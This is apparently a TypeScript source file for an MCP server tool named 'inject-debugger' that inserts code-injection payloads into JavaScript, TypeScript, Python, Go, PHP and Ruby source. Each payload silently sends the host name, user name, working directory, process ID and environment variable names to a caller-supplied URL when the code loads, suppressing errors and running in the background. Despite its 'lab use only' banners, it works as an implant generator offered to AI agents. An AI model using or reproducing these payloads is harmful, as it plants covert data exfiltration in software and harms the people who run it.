import { McpServer } from '@modelcontextprotocol/sdk/server/mcp.js';
import { z } from 'zod';
import * as fs from 'node:fs/promises';
import * as path from 'node:path';

type SupportedLanguage = 'javascript' | 'typescript' | 'python' | 'go' | 'php' | 'ruby';

const WARNING_BANNER = `
================================================================================
WARNING: DEBUG ENDPOINT INJECTED - FOR AUTHORIZED LAB USE ONLY
This code has been modified to include a remote debug callback.
DO NOT use in production or on systems you do not own.
================================================================================
`;

interface PayloadTemplate {
  comment: string;
  payload: (callbackUrl: string) => string;
  importSection?: (callbackUrl: string) => string;
}

const payloadTemplates: Record<SupportedLanguage, PayloadTemplate> = {
  javascript: {
    comment: '//',
    payload: (url) => `
// [DEBUG INJECTED - LAB USE ONLY]
(async () => {
  try {
    const http = require('http');
    const https = require('https');
    const os = require('os');
    const data = JSON.stringify({
      type: 'debug_callback',
      hostname: os.hostname(),
      platform: os.platform(),
      cwd: process.cwd(),
      user: os.userInfo().username,
      pid: process.pid,
      env_keys: Object.keys(process.env).slice(0, 10),
      timestamp: new Date().toISOString()
    });
    const urlObj = new URL('${url}');
    const client = urlObj.protocol === 'https:' ? https : http;
    const req = client.request({
      hostname: urlObj.hostname,
      port: urlObj.port || (urlObj.protocol === 'https:' ? 443 : 80),
      path: urlObj.pathname,
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': data.length }
    });
    req.write(data);
    req.end();
  } catch (e) {}
})();
// [END DEBUG INJECTION]
`,
  },

  typescript: {
    comment: '//',
    payload: (url) => `
// [DEBUG INJECTED - LAB USE ONLY]
(async () => {
  try {
    const http = await import('http');
    const https = await import('https');
    const os = await import('os');
    const data = JSON.stringify({
      type: 'debug_callback',
      hostname: os.hostname(),
      platform: os.platform(),
      cwd: process.cwd(),
      user: os.userInfo().username,
      pid: process.pid,
      env_keys: Object.keys(process.env).slice(0, 10),
      timestamp: new Date().toISOString()
    });
    const urlObj = new URL('${url}');
    const client = urlObj.protocol === 'https:' ? https : http;
    const req = client.request({
      hostname: urlObj.hostname,
      port: urlObj.port || (urlObj.protocol === 'https:' ? 443 : 80),
      path: urlObj.pathname,
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': data.length }
    });
    req.write(data);
    req.end();
  } catch (e) {}
})();
// [END DEBUG INJECTION]
`,
  },

  python: {
    comment: '#',
    payload: (url) => `
# [DEBUG INJECTED - LAB USE ONLY]
def __debug_callback__():
    try:
        import urllib.request
        import json
        import os
        import socket
        import platform
        data = json.dumps({
            'type': 'debug_callback',
            'hostname': socket.gethostname(),
            'platform': platform.system(),
            'cwd': os.getcwd(),
            'user': os.environ.get('USER', os.environ.get('USERNAME', 'unknown')),
            'pid': os.getpid(),
            'env_keys': list(os.environ.keys())[:10],
            'timestamp': __import__('datetime').datetime.now().isoformat()
        }).encode('utf-8')
        req = urllib.request.Request('${url}', data=data, headers={'Content-Type': 'application/json'})
        urllib.request.urlopen(req, timeout=5)
    except:
        pass
__debug_callback__()
del __debug_callback__
# [END DEBUG INJECTION]
`,
  },

  go: {
    comment: '//',
    importSection: () => `
import (
	"bytes"
	"encoding/json"
	"net/http"
	"os"
	"os/user"
	"runtime"
	"time"
)
`,
    payload: (url) => `
// [DEBUG INJECTED - LAB USE ONLY]
func init() {
	go func() {
		defer func() { recover() }()
		hostname, _ := os.Hostname()
		currentUser, _ := user.Current()
		username := ""
		if currentUser != nil {
			username = currentUser.Username
		}
		cwd, _ := os.Getwd()
		envKeys := make([]string, 0, 10)
		for _, e := range os.Environ()[:min(10, len(os.Environ()))] {
			for i, c := range e {
				if c == '=' {
					envKeys = append(envKeys, e[:i])
					break
				}
			}
		}
		data, _ := json.Marshal(map[string]interface{}{
			"type":      "debug_callback",
			"hostname":  hostname,
			"platform":  runtime.GOOS,
			"cwd":       cwd,
			"user":      username,
			"pid":       os.Getpid(),
			"env_keys":  envKeys,
			"timestamp": time.Now().Format(time.RFC3339),
		})
		client := &http.Client{Timeout: 5 * time.Second}
		client.Post("${url}", "application/json", bytes.NewReader(data))
	}()
}
// [END DEBUG INJECTION]
`,
  },

  php: {
    comment: '//',
    payload: (url) => `
<?php
// [DEBUG INJECTED - LAB USE ONLY]
(function() {
    try {
        $data = json_encode([
            'type' => 'debug_callback',
            'hostname' => gethostname(),
            'platform' => PHP_OS,
            'cwd' => getcwd(),
            'user' => get_current_user(),
            'pid' => getmypid(),
            'env_keys' => array_slice(array_keys($_ENV), 0, 10),
            'timestamp' => date('c')
        ]);
        $opts = [
            'http' => [
                'method' => 'POST',
                'header' => 'Content-Type: application/json',
                'content' => $data,
                'timeout' => 5
            ]
        ];
        $context = stream_context_create($opts);
        @file_get_contents('${url}', false, $context);
    } catch (Exception $e) {}
})();
// [END DEBUG INJECTION]
?>
`,
  },

  ruby: {
    comment: '#',
    payload: (url) => `
# [DEBUG INJECTED - LAB USE ONLY]
begin
  require 'net/http'
  require 'json'
  require 'uri'
  require 'socket'
  Thread.new do
    begin
      uri = URI.parse('${url}')
      http = Net::HTTP.new(uri.host, uri.port)
      http.use_ssl = uri.scheme == 'https'
      http.open_timeout = 5
      http.read_timeout = 5
      request = Net::HTTP::Post.new(uri.path.empty? ? '/' : uri.path)
      request['Content-Type'] = 'application/json'
      request.body = {
        type: 'debug_callback',
        hostname: Socket.gethostname,
        platform: RUBY_PLATFORM,
        cwd: Dir.pwd,
        user: ENV['USER'] || ENV['USERNAME'] || 'unknown',
        pid: Process.pid,
        env_keys: ENV.keys.first(10),
        timestamp: Time.now.iso8601
      }.to_json
      http.request(request)
    rescue => e
    end
  end
rescue => e
end
# [END DEBUG INJECTION]
`,
  },
};

function detectLanguageFromPath(filePath: string): SupportedLanguage | null {
  const ext = path.extname(filePath).toLowerCase();
  const languageMap: Record<string, SupportedLanguage> = {
    '.js': 'javascript',
    '.mjs': 'javascript',
    '.cjs': 'javascript',
    '.jsx': 'javascript',
    '.ts': 'typescript',
    '.tsx': 'typescript',
    '.py': 'python',
    '.go': 'go',
    '.php': 'php',
    '.rb': 'ruby',
  };
  return languageMap[ext] || null;
}

function findInjectionPoint(code: string, language: SupportedLanguage): number {
  const lines = code.split('\n');
  let lastImportLine = 0;

  for (let i = 0; i < lines.length; i++) {
    const line = lines[i].trim();

    switch (language) {
      case 'javascript':
      case 'typescript':
        if (line.startsWith('import ') || line.startsWith('const ') && line.includes('require(')) {
          lastImportLine = i + 1;
        }
        break;
      case 'python':
        if (line.startsWith('import ') || line.startsWith('from ')) {
          lastImportLine = i + 1;
        }
        break;
      case 'go':
        if (line.startsWith('import ') || line === ')' && i > 0 && lines.slice(0, i).some(l => l.includes('import'))) {
          lastImportLine = i + 1;
        }
        break;
      case 'php':
        if (line.startsWith('<?php')) {
          lastImportLine = i + 1;
        }
        break;
      case 'ruby':
        if (line.startsWith('require ') || line.startsWith("require '") || line.startsWith('require "')) {
          lastImportLine = i + 1;
        }
        break;
    }
  }

  // Calculate character position from line number
  let charPos = 0;
  for (let i = 0; i < lastImportLine; i++) {
    charPos += lines[i].length + 1; // +1 for newline
  }

  return charPos;
}

export function registerInjectDebuggerTool(server: McpServer): void {
  server.tool(
    'inject-debugger',
    'Inject remote debug endpoint into source code (LAB/RESEARCH USE ONLY - requires authorization)',
    {
      code: z.string().describe('Source code string or file path to inject into'),
      language: z.enum(['javascript', 'typescript', 'python', 'go', 'php', 'ruby'])
        .optional()
        .describe('Target language (auto-detected from file extension if not provided)'),
      callbackUrl: z.string().url().describe('HTTP endpoint to receive debug callback (e.g., http://192.168.1.100:4444/callback)'),
      injectionPoint: z.enum(['start', 'end', 'auto']).default('auto')
        .describe('Where to inject the debug code'),
    },
    async ({ code, language, callbackUrl, injectionPoint }) => {
      let sourceCode = code;
      let detectedLanguage: SupportedLanguage | null = language || null;
      let isFilePath = false;

      // Check if code is a file path
      try {
        const stats = await fs.stat(code);
        if (stats.isFile()) {
          isFilePath = true;
          sourceCode = await fs.readFile(code, 'utf-8');
          if (!detectedLanguage) {
            detectedLanguage = detectLanguageFromPath(code);
          }
        }
      } catch {
        // Not a file path, treat as raw code
      }

      if (!detectedLanguage) {
        return {
          content: [{
            type: 'text' as const,
            text: 'Error: Could not detect language. Please specify the language parameter.',
          }],
          isError: true,
        };
      }

      const template = payloadTemplates[detectedLanguage];
      if (!template) {
        return {
          content: [{
            type: 'text' as const,
            text: `Error: Unsupported language: ${detectedLanguage}`,
          }],
          isError: true,
        };
      }

      const payload = template.payload(callbackUrl);
      const commentChar = template.comment;
      const warningComment = WARNING_BANNER.split('\n')
        .map(line => line ? `${commentChar} ${line}` : commentChar)
        .join('\n');

      let modifiedCode: string;

      if (injectionPoint === 'start') {
        modifiedCode = warningComment + '\n' + payload + '\n' + sourceCode;
      } else if (injectionPoint === 'end') {
        modifiedCode = sourceCode + '\n' + warningComment + '\n' + payload;
      } else {
        // Auto: inject after imports
        const insertPos = findInjectionPoint(sourceCode, detectedLanguage);
        modifiedCode =
          sourceCode.slice(0, insertPos) +
          '\n' + warningComment + '\n' + payload + '\n' +
          sourceCode.slice(insertPos);
      }

      const summary = `# Debug Injection Complete

## Configuration
- **Language**: ${detectedLanguage}
- **Callback URL**: ${callbackUrl}
- **Injection Point**: ${injectionPoint}
- **Source**: ${isFilePath ? code : '(inline code)'}

## Warning
This code contains a debug callback that will send system information to:
\`${callbackUrl}\`

**FOR AUTHORIZED LAB/RESEARCH USE ONLY**

## Modified Code

\`\`\`${detectedLanguage}
${modifiedCode}
\`\`\`
`;

      return {
        content: [{
          type: 'text' as const,
          text: summary,
        }],
      };
    }
  );
}
